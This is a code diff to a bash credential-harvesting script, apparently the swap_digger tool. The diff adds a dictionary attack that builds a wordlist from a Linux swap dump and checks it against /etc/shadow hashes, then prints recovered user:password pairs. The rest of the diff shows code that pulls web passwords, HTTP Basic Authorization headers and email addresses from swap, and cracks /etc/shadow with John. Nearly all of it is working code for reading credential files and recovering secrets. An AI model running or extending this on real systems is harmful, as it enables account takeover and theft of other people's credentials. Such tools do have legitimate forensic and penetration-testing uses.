@@ -86,9 +86,10 @@ function dig_unix_passwd () {
     out
     blue " ==== Linux system accounts ==="
     out
-    out " [+] Digging linux accounts credentials..."
+    out " [+] Digging linux accounts credentials... (pattern attack)"
     SHADOWHASHES="$(cut -d':' -f 2 ${TARGET_ROOT_DIR}etc/shadow | grep -E '^\$.\$')"
     while read -r thishash; do
+        [ $VERBOSE ] && out "   [-] Digging for hash: $thishash ..."
         DUMP=`grep -C40 "$thishash" "$swap_dump_path"`
         CTYPE="$(echo "$thishash" | cut -c-3)"
         SHADOWSALT="$(echo "$thishash" | cut -d'$' -f 3)"
@@ -105,19 +106,47 @@ function dig_unix_passwd () {
             fi
         done <<< "$DUMP"
     done <<< "$SHADOWHASHES"
-    
+    out
     nbHashes="$(cut -d':' -f 2 ${TARGET_ROOT_DIR}etc/shadow | grep -c -E '^\$.\$')"
     if [ ${#passwordList[@]} -lt $nbHashes ]
     then
-        if john 2> /dev/null | grep -q cracker && ask "John was detect on the system, attempt to crack ${TARGET_ROOT_DIR}etc/shadow based on dumped swap wordlist?"
+        out " [+] Digging linux accounts credentials method 2 ... (dictionnary attack)"
+        out "   [-] Generating wordlist file..."
+        strings --bytes=8 "$swap_dump_path" | sort | uniq -d | sed '/^.\{20\}./d' > "$swap_wordlist_path"  # For performance we have to assume password is present more than once and if between 8 and 20 char
+        out "   [-] Digging passwords in wordlist... (This may take 5 to 20 minutes)"
+        SHADOWHASHES="$(cut -d':' -f 2 ${TARGET_ROOT_DIR}etc/shadow | grep -E '^\$.\$')"
+        while read -r thishash; do
+            [ $VERBOSE ] && out "   [-] Digging for hash: $thishash ..."
+            DUMP=`cat $swap_wordlist_path`
+            CTYPE="$(echo "$thishash" | cut -c-3)"
+            SHADOWSALT="$(echo "$thishash" | cut -d'$' -f 3)"
+            while read -r line; do
+                #Escape quotes, backslashes, single quotes to pass into crypt
+                SAFE=$(echo "$line" | sed 's/\\/\\\\/g; s/\"/\\"/g; s/'"'"'/\\'"'"'/g;')
+                CRYPT="\"$SAFE\", \"$CTYPE$SHADOWSALT\""
+                if [[ $(python2 -c "import crypt; print crypt.crypt($CRYPT)") == "$thishash" ]]; then
+                    #Find which user's password it is (useful if used more than once!)
+                    USER="$(grep "${thishash}" /etc/shadow | cut -d':' -f 1)"
+                    out "   [-] $USER:$line"
+                    passwordList=("${passwordList[@]}" "$line")
+                    break
+                fi
+            done <<< "$DUMP"
+        done <<< "$SHADOWHASHES"
+    fi
+    out
+    nbHashes="$(cut -d':' -f 2 ${TARGET_ROOT_DIR}etc/shadow | grep -c -E '^\$.\$')"
+    if [ ${#passwordList[@]} -lt $nbHashes ]
+    then
+        if john 2> /dev/null | grep -q cracker && ask "Passwords were not found and John was detected on the system, attempt to crack ${TARGET_ROOT_DIR}etc/shadow based on dumped swap wordlist?"
         then
             out
-            out " [+] Digging linux accounts credentials method 2..."
+            out " [+] Digging linux accounts credentials method 3... (John attack)"
             out " [+] Cracking linux account passwords using John."
-            out "   [-] Generate wordlist file..."
+            out "   [-] Generating wordlist file..."
             #uniq "$swap_dump_path" | sed '/^.\{40\}./d' > "$swap_wordlist_path" # account password are generally less then 40 char
-            uniq -d "$swap_dump_path" | sed '/^.\{40\}./d' > "$swap_wordlist_path"  # You can use this line to go faster, account password are generally present more than once and less then 40 char
-            echo "   [-] Cracking ${TARGET_ROOT_DIR}etc/shadow using wordlist... (This make take a some time)"
+            sort "$swap_dump_path" | uniq -d | sed '/^.\{40\}./d' > "$swap_wordlist_path"  # You can use this line to go faster, account password are generally present more than once and less then 40 char
+            out "   [-] Cracking ${TARGET_ROOT_DIR}etc/shadow using wordlist... (This may take some time)"
             if john "${TARGET_ROOT_DIR}etc/shadow" -wordlist:"$swap_wordlist_path"
             then
                 OLDIFS=$IFS; IFS=$'\n';
@@ -137,6 +166,7 @@ function dig_unix_passwd () {
             fi
         fi
     fi
+
 }
 
 
@@ -160,7 +190,7 @@ function dig_web_info () {
     done
     IFS=$OLDIFS
     out
-    echo " [+] Looking for web passwords method 2 (JSON) ..."
+    out " [+] Looking for web passwords method 2 (JSON) ..."
     OLDIFS=$IFS; IFS=$'\n';
     for entry in `grep "password\",\"value\":\"" "$swap_dump_path"`
     do
@@ -175,7 +205,7 @@ function dig_web_info () {
     done
     IFS=$OLDIFS
     out
-    echo " [+] Looking for web passwords method 3 (HTTP Basic Authentication) ..."
+    out " [+] Looking for web passwords method 3 (HTTP Basic Authentication) ..."
     OLDIFS=$IFS; IFS=$'\n';
     for entry in `grep -E '^Authorization: Basic.+=$' "$swap_dump_path" | cut -d' ' -f 3`
     do
@@ -189,7 +219,7 @@ function dig_web_info () {
     IFS=$OLDIFS
     # Looking for web entered email address
     out
-    echo " [+] Looking for web entered emails..."
+    out " [+] Looking for web entered emails..."
     OLDIFS=$IFS; IFS=$'\n';
     for entry in `grep -i 'email=' "$swap_dump_path" | grep @ | uniq`
     do
@@ -319,7 +349,7 @@ function guessing () {
                 occurence=`grep -c "$line" "$swap_dump_path" 2>/dev/null`
                 if [ $occurence -gt 0 ]
                 then
-                    [ $VERBOSE ] && echo "  [-] Potential password: $line"
+                    [ $VERBOSE ] && out "  [-] Potential password: $line"
                     guessedPasswordList=("${guessedPasswordList[@]}" "$line")
                 fi
             fi
@@ -351,7 +381,7 @@ function guessing () {
                 occurence=`grep -c "$line" "$swap_dump_path" 2>/dev/null`
                 if [ $occurence -gt 1 ]
                 then
-                    [ $VERBOSE ] && echo "  [-] Potential password: $line"
+                    [ $VERBOSE ] && out "  [-] Potential password: $line"
                     passwordList=("${passwordList[@]}" "$line")
                 fi
             fi
@@ -372,17 +402,16 @@ function guessing () {
     done
     IFS=$OLDIFS
     out
-    
 }
 
 
 function swap_digger () {
     out
     blue "- SWAP Digger -"
-    out
     [ $LOG ] && note "Logging all outputs in $LOG_FILE"
     # Find swap partition
     [ -f "$swap_dump_path" ] || {
+        out
         out " [+] Looking for swap partition"
         swap=`cat /proc/swaps | grep -o "/[^ ]\+"`
         [ -b "$swap" ] || swap=`swapon -s | grep dev | cut -d " " -f 1`
